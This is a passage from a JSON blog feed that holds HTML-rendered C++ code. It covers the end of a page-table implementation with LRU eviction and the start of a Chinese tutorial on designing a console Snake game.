memory\"</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>  size_t <span class=\"token class-name\">PageTable</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">loaded_pages</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>    <span class=\"token keyword\">return</span> page_num<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>  <span class=\"token comment\">// Checks to see if the specified page is loaded into memory</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>  <span class=\"token comment\">// Arguments: The virtual page number of the page to check for</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>  <span class=\"token comment\">// Returns: True iff the page is loaded into memory, false otherwise</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>  <span class=\"token keyword\">bool</span> <span class=\"token class-name\">PageTable</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">page_available</span><span class=\"token punctuation\">(</span>pno_t virtual_pno<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>    <span class=\"token keyword\">return</span> mp<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span>virtual_pno<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> mp<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>  <span class=\"token comment\">// Makes sure that all currently loaded pages are flushed</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>  <span class=\"token comment\">// meaning tha the page contents are updated on the swap file.</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>  <span class=\"token comment\">// This should not affect how recently used each page is and all pages</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>  <span class=\"token comment\">// will remain loaded into memory after this operation is performed.</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>  <span class=\"token comment\">// Arguments: None</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>  <span class=\"token comment\">// Returns: Nothing</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token class-name\">PageTable</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">flush_all_pages</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">auto</span> p<span class=\"token operator\">:</span>page_list<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>        p<span class=\"token punctuation\">.</span>second<span class=\"token operator\">-></span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>  <span class=\"token comment\">// Flushes the specified page to the swap file.</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>  <span class=\"token comment\">// This should not affect how recently used each page is and all pages</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>  <span class=\"token comment\">// will remain loaded into memory after this operation is performed.</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>  <span class=\"token comment\">// Arguments: the virtual page number of the page to flush</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>  <span class=\"token comment\">// Returns: Nothing</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token class-name\">PageTable</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">flush_page</span><span class=\"token punctuation\">(</span>pno_t virtual_pno<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">page_available</span><span class=\"token punctuation\">(</span>virtual_pno<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>        Page<span class=\"token operator\">*</span> p <span class=\"token operator\">=</span> mp<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span>virtual_pno<span class=\"token punctuation\">)</span><span class=\"token operator\">-></span>second<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>        p<span class=\"token operator\">-></span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre></pre></td></tr><tr><td data-num=\"153\"></td><td><pre>  <span class=\"token comment\">// Discards the specified page from the PageTable.</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>  <span class=\"token comment\">// If the page is dirty, then it is flushed before it is discarded.</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>  <span class=\"token comment\">// If the page is not in the table, then nothing happens.</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>  <span class=\"token comment\">// Arguments: the virtual page number of the page to discard.</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>  <span class=\"token comment\">// Returns: Nothing</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token class-name\">PageTable</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">discard_page</span><span class=\"token punctuation\">(</span>pno_t virtual_pno<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">page_available</span><span class=\"token punctuation\">(</span>virtual_pno<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre>        Page<span class=\"token operator\">*</span> p <span class=\"token operator\">=</span> mp<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span>virtual_pno<span class=\"token punctuation\">)</span><span class=\"token operator\">-></span>second<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"163\"></td><td><pre>        p<span class=\"token operator\">-></span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"164\"></td><td><pre>        page_list<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span>std<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">make_pair</span><span class=\"token punctuation\">(</span>virtual_pno<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>        mp<span class=\"token punctuation\">.</span><span class=\"token function\">erase</span><span class=\"token punctuation\">(</span>virtual_pno<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre>        page_num <span class=\"token operator\">-=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre></pre></td></tr><tr><td data-num=\"170\"></td><td><pre>  <span class=\"token comment\">// Evicts a page from the PageTable. The page evicted</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>  <span class=\"token comment\">// should be the least recntly used page in the cache.</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre>  <span class=\"token comment\">// If the evicted page is dirty, then it is flushed before it is evicted.</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>  <span class=\"token comment\">// If there are no pages in the cache, then do nothing.</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>  <span class=\"token comment\">// Arguments: None</span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>  <span class=\"token comment\">// Returns: Nothing</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token class-name\">PageTable</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">evict_page</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>    pno_t current_pno <span class=\"token operator\">=</span> page_list<span class=\"token punctuation\">.</span><span class=\"token function\">back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>first<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"180\"></td><td><pre>    Page<span class=\"token operator\">*</span> p <span class=\"token operator\">=</span> page_list<span class=\"token punctuation\">.</span><span class=\"token function\">back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>second<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"181\"></td><td><pre>    <span class=\"token comment\">// find the value in unordered_map</span></pre></td></tr><tr><td data-num=\"182\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">auto</span> it <span class=\"token operator\">=</span> mp<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> it <span class=\"token operator\">!=</span> mp<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> it<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"183\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>it<span class=\"token operator\">-></span>first <span class=\"token operator\">==</span> current_pno <span class=\"token operator\">&amp;&amp;</span> it<span class=\"token operator\">-></span>second <span class=\"token operator\">==</span> p<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"184\"></td><td><pre>            mp<span class=\"token punctuation\">.</span><span class=\"token function\">erase</span><span class=\"token punctuation\">(</span>it<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"185\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"186\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"187\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"188\"></td><td><pre>    page_list<span class=\"token punctuation\">.</span><span class=\"token function\">pop_back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"189\"></td><td><pre>    p<span class=\"token operator\">-></span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"190\"></td><td><pre>    page_num <span class=\"token operator\">-=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"191\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"192\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2023/10/31/Projects/Snake/analysis/",
            "url": "https://salvely.github.io/blog/2023/10/31/Projects/Snake/analysis/",
            "title": "动手写贪吃蛇游戏",
            "date_published": "2023-10-31T02:04:46.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"markdownIt-Anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>最近学习了 C++ STL, 想着自己使用 C++ 实现一个贪吃蛇的小游戏，锻炼一下 C++ 代码能力和软件工程能力。完整代码参见：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NhbHZlbHkvV2Vla2x5LXJlcG9ydC90cmVlL21haW4vd2VlazEvY29kZS9zbmFrZQ==\">贪吃蛇小游戏 ——C++ 实现</span></p>\n<h1 id=\"贪吃蛇的基本规则\"><a class=\"markdownIt-Anchor\" href=\"#贪吃蛇的基本规则\">#</a> 贪吃蛇的基本规则</h1>\n<p>首先，有一块场地，场地周围是墙，场地内的部分是墙，部分是食物，部分是蛇。贪吃蛇没吃到任何东西，就正常移动；吃到食物，尾巴会增长；如果吃到了自己的尾巴或者撞了墙，游戏结束。</p>\n<h2 id=\"游戏基本设定\"><a class=\"markdownIt-Anchor\" href=\"#游戏基本设定\">#</a> 游戏基本设定</h2>\n<ol>\n<li>场地内部墙的个数在 [1,min (height-2,width-2)] 之间</li>\n<li>1 次只出现一个食物</li>\n<li>用户输入场地规格必须大于 3</li>\n<li>默认蛇的移动方向向右，初始位置随机生成</li>\n<li>如果贪吃蛇吃到了食物，会在新的地方生成食物</li>\n<li>因为本人使用 <code>vscode</code>  编程，无法弹出控制台，因此无法追踪光标位置，也就难以实现原地打印。因此，本程序中使用每 1s 打印一次棋盘的方式.</li>\n</ol>\n<h1 id=\"贪吃蛇对象划分\"><a class=\"markdownIt-Anchor\" href=\"#贪吃蛇对象划分\">#</a> 贪吃蛇对象划分</h1>\n<ul>\n<li>场地：周围用<strong>墙</strong>环绕，里面有部分墙，<strong>食物</strong>和<strong>蛇</strong></li>\n<li>游戏本身\n<ul>\n<li>游戏分数：贪吃蛇吃到的食物数量</li>\n<li>游戏状态：用 <code>true</code> / <code>false</code>  表示是否结束</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"贪吃蛇对象设计\"><a class=\"markdownIt-Anchor\" href=\"#贪吃蛇对象设计\">#</a> 贪吃蛇对象设计</h1>\n<ul>\n<li>场地：\n<ul>\n<li>场地本身：使用一个二维数组表示，场地内的墙用 <code>#</code> 表示，蛇用 <code>S</code>  表示，食物用 <code>$</code>  表示，普通平地用 `` 表示。某个单位只能出现一个物种，不可能同时出现两种。</li>\n<li>场地的长、宽：用 <code>int</code>  类型表示</li>\n<li>蛇：使用一个结构体进行存储，其中几个字段分别为：\n<ul>\n<li>整条蛇的位置信息：使用一个 <code>std::deque</code>  存储，其中单个位置信息使用 <code>std::pair&lt;int,int&gt;</code>  来存储</li>\n<li>蛇的运动方向：使用 <code>int</code>  存储 (使用一个枚举类型 <code>INPUT_KEY</code> ，来表示对应的 <code>int</code>  值)</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>游戏：使用一个结构体进行存储，其中几个字段分别为：\n<ul>\n<li>游戏分数：使用 <code>int</code>  类型存储</li>\n<li>游戏状态：使用 <code>true/false</code>  表示是否结束</li>\n<li>用户的名字</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"游戏主逻辑设计\"><a class=\"markdownIt-Anchor\" href=\"#游戏主逻辑设计\">#</a> 游戏主逻辑设计</h1>\n<ol>\n<li>提示用户输入游戏场地规格：长，宽 / 默认（不输入）</li>\n<li>提示用户输入姓名</li>\n<li>初始化游戏场地</li>\n<li>初始化游戏分数和状态</li>\n<li>初始化默认开始方向</li>\n<li><code>while</code>  游戏没有结束\n<ol>\n<li>获取用户方向输入</li>\n<li>如果没有输入方向，则按照上次的方向继续</li>\n<li>根据用户输入方向更新游戏状态</li>\n<li>打印棋盘</li>\n</ol>\n</li>\n<li>通知用户游戏结束，打印其姓名和分数，清理程序中所有的值</li>\n</ol>\n<h1 id=\"游戏状态更新逻辑\"><a class=\"markdownIt-Anchor\" href=\"#游戏状态更新逻辑\">#</a> 游戏状态更新逻辑</h1>\n<pre><code>1. 根据蛇头，计算下一个位置的坐标\n2. 如果场地中下个位置的值是`S`，判断其是否为蛇尾，如果不是蛇尾或者是墙，游戏结束\n3. 如果下个位置是`$`，则(不去掉蛇尾):\n   1. 游戏分数+1\n4. 否则：\n   1. 将场地蛇尾处`S`修改为' '\n5. 将下一个位置加载蛇头\n6. 将蛇头处' '修改为`S`\n</code></pre>\n<h1 id=\"游戏对象定义game_inith\"><a class=\"markdownIt-Anchor\" href=\"#游戏对象定义game_inith\">#</a> 游戏对象定义 ( <code>game_init.h</code> )</h1>\n<h2 id=\"蛇\"><a class=\"markdownIt-Anchor\" href=\"#蛇\">#</a> 蛇</h2>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;deque></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// define the user input</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">enum</span> <span class=\"token class-name\">INPUT_KEY</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    RIGHT <span class=\"token operator\">=</span> <span class=\"token number\">77</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    LEFT <span class=\"token operator\">=</span> <span class=\"token number\">75</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    UP <span class=\"token operator\">=</span> <span class=\"token number\">72</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    DOWN <span class=\"token operator\">=</span> <span class=\"token number\">80</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">// define the snake</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    INPUT_KEY direction<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    std<span class=\"token double-colon punctuation\">::</span>deque<span class=\"token operator\">&lt;</span>std<span class=\"token double-colon punctuation\">::</span>pair<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token operator\">>></span> position<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span> snake<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"游戏\"><a class=\"markdownIt-Anchor\" href=\"#游戏\">#</a> 游戏</h2>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// define the game</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">int</span> score<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">bool</span> end<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span> game<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"场地\"><a class=\"markdownIt-Anchor\" href=\"#场地\">#</a> 场地</h2>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// define the board</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>arr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">int</span> width<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">int</span> height<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    snake s<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span> board<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h1 id=\"游戏对象初始化game_initc\"><a class=\"markdownIt-Anchor\" href=\"#游戏对象初始化game_initc\">#</a> 游戏对象初始化（ <code>game_init.c</code> ）</h1>\n<h2 id=\"游戏初始化\"><a class=\"markdownIt-Anchor\" href=\"#游戏初始化\">#</a> 游戏初始化</h2>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> * @brief Initialize the game</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> * @param g the game struct</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> * @param name the name of the user</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">init_game</span><span class=\"token punctuation\">(</span>game <span class=\"token operator\">&amp;</span>g<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    g<span class=\"token punctuation\">.</span>end <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    g<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    g<span class=\"token punctuation\">.</span>score <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"场地初始化\"><a class=\"markdownIt-Anchor\" href=\"#场地初始化\">#</a> 场地初始化</h2>\n<h3 id=\"初始化内容\"><a class=\"markdownIt-Anchor\" href=\"#初始化内容\">#</a> 初始化内容</h3>\n<p>场地的初始化包括初始化如下几个部分：</p>\n<blockquote>\n<ul>\n<li>场地：</li>\n<li>场地本身：使用一个二维数组表示，场地内的墙用 <code>#</code> 表示，蛇用 <code>S</code>  表示，食物用 <code>$</code>  表示，普通平地用 `` 表示。某个单位只能出现一个物种，不可能同时出现两种。</li>\n<li>场地的长、宽：用 <code>int</code>  类型表示</li>\n<li>蛇：使用一个结构体进行存储，其中几个字段分别为：\n<ul>\n<li>整条蛇的位置信息：使用一个 <code>std::deque</code>  存储，其中单个位置信息使用 <code>std::pair&lt;int,int&gt;</code>  来存储</li>\n<li>蛇的运动方向：使用 <code>int</code>  存储 (使用一个枚举类型 <code>INPUT_KEY</code> ，来表示对应的 <code>int</code>  值)</li>\n</ul>\n</li>\n</ul>\n</blockquote>\n<h3 id=\"初始化步骤\"><a class=\"markdownIt-Anchor\" href=\"#初始化步骤\">#</a> 初始化步骤</h3>\n<p>初始化的过程分为如下步骤：</p>\n<ol>\n<li>初始化场地的长和宽</li>\n<li>初始化一个对应长和宽的二维数组，且其值为 ``</li>\n<li>让二维数组的四周为 <code>#</code></li>\n<li>使用随机数生成器生成一个 [1,min (height-2,width-2)] 内随机的内部墙数量</li>\n<li>随机生成内部墙的坐标</li>\n<li>在对应位置处放置 <code>#</code></li>\n<li>随机生成食物的坐标</li>\n<li>在对应位置处放置 <code>$</code></li>\n<li>随机生成蛇的坐标</li>\n<li>初始化蛇，方向向右</li>\n<li>在对应位置处放置 <code>S</code></li>\n</ol>\n<h3 id=\"辅助函数-1随机数生成器\"><a class=\"markdownIt-Anchor\" href=\"#辅助函数-1随机数生成器\">#</a> 辅助函数 1：随机数生成器</h3>\n<p>C++  <code>std::rand()</code>  函数生成一个 [0, <code>RAND_MAX</code> ) 之间的数字。如果我们想生成一个 [0,num] 范围内的数字，需要  <code>(1 + std::rand()) % num</code> 。如果 <code>num&lt;=0</code> ，我们不生成，直接返回 0。</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> * @brief generate a random number between [1,num]</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> * @param num the maximum of the random number</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> * @return int the random number generated</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">random</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> num<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>num <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">+</span> std<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> num <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"辅助函数-2place函数\"><a class=\"markdownIt-Anchor\" href=\"#辅助函数-2place函数\">#</a> 辅助函数 2： <code>place</code>  函数</h3>\n<p><code>food</code>  和 <code>snake</code>  一次只放置 1 个。 <code>food</code>  在初始化和每次被蛇吃掉后都需要重新放置（后期 <code>update</code> ）中还需要调用，而 <code>snake</code>  只有在初始化时候需要放置。因为其每次都是持续搜索，直到找到标记为 `` 的位置，因此我们写了一个 <code>place</code>  函数用于放置内容。该函数返回一个 <code>pair</code> ，用于 <code>snake</code>  初始化时将坐标压到 <code>deque</code>  中。</p>\n<figure class=\"highlight 